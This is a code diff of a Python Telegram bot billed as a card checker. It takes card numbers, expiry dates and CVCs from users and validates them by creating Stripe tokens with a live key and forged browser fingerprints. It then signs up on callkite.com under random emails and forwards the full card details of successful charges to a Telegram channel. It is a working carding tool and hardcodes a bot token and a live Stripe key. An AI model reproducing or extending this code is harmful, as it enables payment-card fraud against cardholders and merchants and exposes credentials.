@@ -1,14 +1,13 @@
 import telebot
 import requests
-import urllib.parse
 import random
 import string
 
 BOT_TOKEN = "8072279299:AAF7-9MjDIYkoH6iuDztpbSmyQBvz3kRjG0"
+CHANNEL_ID = -1002170961342  # Your Telegram channel ID
 bot = telebot.TeleBot(BOT_TOKEN)
 
-FIXED_PHONE = "+13144740467"
-FIXED_ZIP = "BA3 HAL"
+STRIPE_PUBLISHABLE_KEY = "pk_live_aS5XfyascG0bAVDXZDAZdX4j"
 
 def generate_random_email():
     name = ''.join(random.choices(string.ascii_lowercase + string.digits, k=8))
@@ -17,77 +16,92 @@ def generate_random_email():
 @bot.message_handler(commands=['start'])
 def start_handler(message):
     bot.send_message(message.chat.id,
-        "💳 Welcome to Card Checker Bot\n"
-        "Please enter your credit card details in the format:\n"
-        "CardNumber|ExpMonth|ExpYear|CVC\n"
-        "Example:\n4242424242424242|10|28|123"
+        "💳 CallKite Card Checker\n"
+        "Send card details in this format:\n"
+        "<code>CardNumber|MM|YY|CVC</code>\n"
+        "Example:\n<code>5275150097242499|09|28|575</code>",
+        parse_mode="HTML"
     )
 
 @bot.message_handler(func=lambda m: '|' in m.text)
 def card_handler(message):
     try:
         card_number, exp_month, exp_year, cvc = map(str.strip, message.text.split('|'))
+        email = generate_random_email()
+        plan = "monthly"
 
-        with requests.Session() as session:
-            # Step 1: Get CSRF cookie and session cookies
-            session.get(
-                "https://api.pocketpa.com/sanctum/csrf-cookie",
-                headers={
-                    "ppa-locale": "en",
-                    "accept": "application/json",
-                    "origin": "https://app.pocketpa.com",
-                    "referer": "https://app.pocketpa.com/"
-                }
-            )
+        # 1. Create Stripe token
+        stripe_data = {
+            "card[number]": card_number.replace(" ", ""),
+            "card[cvc]": cvc,
+            "card[exp_month]": exp_month.zfill(2),
+            "card[exp_year]": exp_year if len(exp_year) == 4 else "20" + exp_year,
+            "guid": ''.join(random.choices(string.ascii_lowercase + string.digits, k=32)),
+            "muid": ''.join(random.choices(string.ascii_lowercase + string.digits, k=32)),
+            "sid": ''.join(random.choices(string.ascii_lowercase + string.digits, k=32)),
+            "payment_user_agent": "stripe.js/1cb064bd1e; stripe-js-v3/1cb064bd1e; card-element",
+            "time_on_page": str(random.randint(10000, 99999)),
+            "referrer": "https://callkite.com",
+            "key": STRIPE_PUBLISHABLE_KEY
+        }
 
-            # Decode XSRF-TOKEN cookie value
-            raw_token = session.cookies.get("XSRF-TOKEN", "")
-            xsrf_token = urllib.parse.unquote(raw_token)
-
-            # Generate random email for each request
-            email = generate_random_email()
-
-            payload = {
-                "name": "Telegram User",
-                "email": email,
-                "phone": FIXED_PHONE,
-                "country_code": "1",
-                "password": "TempPass123!",
-                "locale": "en",
-                "plan_id": "price_1NK6JMDuSyQMYtIMfauDnsfM",
-                "zip_code": FIXED_ZIP,
-                "is_affiliate": False,
-                "card": {
-                    "number": card_number.replace(" ", ""),
-                    "exp_month": exp_month.zfill(2),
-                    "exp_year": exp_year[-2:],  # last two digits of year
-                    "cvc": cvc
-                }
+        stripe_resp = requests.post(
+            "https://api.stripe.com/v1/tokens",
+            data=stripe_data,
+            headers={
+                "content-type": "application/x-www-form-urlencoded",
+                "accept": "application/json",
+                "origin": "https://js.stripe.com",
+                "referer": "https://js.stripe.com/"
             }
+        )
+        stripe_json = stripe_resp.json()
 
-            # Step 2: POST register with session cookies and XSRF header
-            response = session.post(
-                "https://api.pocketpa.com/api/register",
-                json=payload,
-                headers={
-                    "x-xsrf-token": xsrf_token,
-                    "ppa-locale": "en",
-                    "accept": "application/json",
-                    "content-type": "application/json",
-                    "origin": "https://app.pocketpa.com",
-                    "referer": "https://app.pocketpa.com/"
-                }
+        if "error" in stripe_json:
+            bot.reply_to(message, f"❌ Card Declined (Stripe):\n{stripe_json['error'].get('message', 'Unknown error')}")
+            return
+
+        token = stripe_json.get("id")
+        if not token or not token.startswith("tok_"):
+            bot.reply_to(message, f"❌ Failed to get Stripe token:\n{stripe_json}")
+            return
+
+        # 2. Use token to signup on CallKite
+        signup_payload = {
+            "email": email,
+            "token": token,
+            "plan": plan
+        }
+        signup_resp = requests.post(
+            "https://callkite.com/api/signup",
+            json=signup_payload,
+            headers={
+                "content-type": "application/json",
+                "accept": "*/*",
+                "origin": "https://callkite.com",
+                "referer": "https://callkite.com/signup"
+            }
+        )
+        signup_json = signup_resp.json()
+
+        if signup_json.get("success") is True:
+            subscription_id = signup_json.get("subscription", {}).get("id", "N/A")
+            success_msg = (
+                f"✅ Payment Successful!\n\n"
+                f"Card Details:\n"
+                f"Number: {card_number}\n"
+                f"Expiry: {exp_month}/{exp_year}\n"
+                f"CVC: {cvc}\n\n"
+                f"Subscription ID: {subscription_id}\n"
+                f"Full Response:\n{signup_json}"
             )
-
-            resp_json = response.json()
-
-            if response.status_code == 201:
-                bot.reply_to(message, "Your Card Was Added ✅")
-            else:
-                status_msg = f"Status code: {response.status_code}\nResponse JSON:\n{resp_json}"
-                bot.reply_to(message, status_msg)
+            bot.reply_to(message, "✅ Your Card Was Added")
+            bot.send_message(CHANNEL_ID, success_msg)
+        else:
+            error_message = signup_json.get("message", "Something went wrong")
+            bot.reply_to(message, f"❌ Card Declined or Error:\n{error_message}")
 
     except Exception as e:
-        bot.reply_to(message, f"Error: {str(e)}")
+        bot.reply_to(message, f"⚠️ Error: {str(e)}")
 
 bot.infinity_polling()
